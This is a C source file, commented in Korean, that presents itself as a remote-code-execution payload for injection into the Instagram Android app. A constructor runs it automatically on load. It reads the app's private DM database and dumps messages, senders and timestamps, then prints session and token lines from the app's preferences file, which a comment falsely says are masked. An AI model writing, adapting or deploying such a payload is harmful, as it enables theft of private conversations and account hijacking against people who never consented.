#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>

/* sqlite3 타입 정의 */
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open_v2(const char *filename, sqlite3 **ppDb, int flags, const char *zVfs);
int sqlite3_prepare_v2(sqlite3 *db, const char *zSql, int nByte, sqlite3_stmt **ppStmt, const char **pzTail);
int sqlite3_step(sqlite3_stmt *pStmt);
const unsigned char *sqlite3_column_text(sqlite3_stmt *pStmt, int iCol);
sqlite3_int64 sqlite3_column_int64(sqlite3_stmt *pStmt, int iCol);
int sqlite3_finalize(sqlite3_stmt *pStmt);
int sqlite3_close(sqlite3 *db);
const char *sqlite3_errmsg(sqlite3 *db);

/*
 * Real RCE: Instagram 프로세스 내에서 실행되는 코드
 * DM 데이터베이스를 직접 읽음
 */

typedef struct {
    char thread_id[256];
    char thread_title[256];
    char message_text[1024];
    char sender[256];
    long timestamp;
} dm_message_t;

// Instagram 프로세스 내에서 실행될 함수
void extract_dm_messages() {
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    int rc;

    printf("\n[RCE] Instagram 프로세스 내 실행 시작\n");
    printf("[RCE] 권한: %d\n", getuid());
    printf("[RCE] PID: %d\n", getpid());

    // Instagram 데이터베이스 경로
    const char *db_path = "/data/data/com.instagram.android/databases/direct_v2.db";

    printf("[RCE] 데이터베이스 열기: %s\n", db_path);

    // 데이터베이스 열기
    rc = sqlite3_open_v2(db_path, &db, SQLITE_OPEN_READONLY, NULL);

    if (rc != SQLITE_OK) {
        printf("[RCE] 데이터베이스 열기 실패: %s\n", sqlite3_errmsg(db));
        return;
    }

    printf("[RCE] 데이터베이스 성공적으로 열림\n");

    // DM 스레드 테이블 쿼리
    const char *query =
        "SELECT "
        "  dt.thread_id, "
        "  dt.thread_title, "
        "  dm.text, "
        "  dm.user_id, "
        "  dm.timestamp "
        "FROM direct_thread dt "
        "LEFT JOIN direct_message dm ON dt.id = dm.thread_id "
        "ORDER BY dm.timestamp DESC "
        "LIMIT 50";

    printf("[RCE] 쿼리 실행 중...\n");

    rc = sqlite3_prepare_v2(db, query, -1, &stmt, NULL);

    if (rc != SQLITE_OK) {
        printf("[RCE] 쿼리 준비 실패: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return;
    }

    printf("\n");
    printf("========================================\n");
    printf("[RCE] INSTAGRAM DM 메시지 추출 시작\n");
    printf("========================================\n\n");

    int msg_count = 0;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char *thread_id = (const char *)sqlite3_column_text(stmt, 0);
        const char *thread_title = (const char *)sqlite3_column_text(stmt, 1);
        const char *message_text = (const char *)sqlite3_column_text(stmt, 2);
        const char *user_id = (const char *)sqlite3_column_text(stmt, 3);
        long timestamp = sqlite3_column_int64(stmt, 4);

        if (message_text) {
            msg_count++;
            printf("[메시지 %d]\n", msg_count);
            printf("  스레드: %s\n", thread_title ? thread_title : "N/A");
            printf("  발신자: %s\n", user_id ? user_id : "Unknown");
            printf("  내용: %s\n", message_text);
            printf("  시간: %ld\n", timestamp);
            printf("\n");
        }
    }

    printf("========================================\n");
    printf("[RCE] 총 %d개의 메시지 추출됨\n", msg_count);
    printf("========================================\n\n");

    // SharedPreferences에서 세션 토큰 읽기
    printf("[RCE] 세션 토큰 추출 중...\n");

    const char *pref_path = "/data/data/com.instagram.android/shared_prefs/InstagramPreferences.xml";
    FILE *pref_file = fopen(pref_path, "r");

    if (pref_file) {
        char line[1024];
        printf("\n[세션 토큰]\n");

        while (fgets(line, sizeof(line), pref_file)) {
            if (strstr(line, "token") || strstr(line, "session")) {
                // 민감한 정보는 마스킹
                printf("%s", line);
            }
        }

        fclose(pref_file);
    } else {
        printf("[RCE] SharedPreferences 읽기 실패\n");
    }

    printf("\n========================================\n");
    printf("[RCE] 데이터 추출 완료\n");
    printf("========================================\n\n");

    // Cleanup
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

// JNI entrypoint (Java에서 호출)
void rce_execute() {
    printf("\n[RCE INIT] RCE 페이로드 실행됨\n");
    printf("[RCE INIT] Instagram 프로세스 내 코드 실행\n");

    extract_dm_messages();

    printf("[RCE COMPLETE] RCE 실행 완료\n");
}

// 프로세스에 주입되면 자동으로 실행되는 생성자
__attribute__((constructor))
void rce_constructor() {
    rce_execute();
}
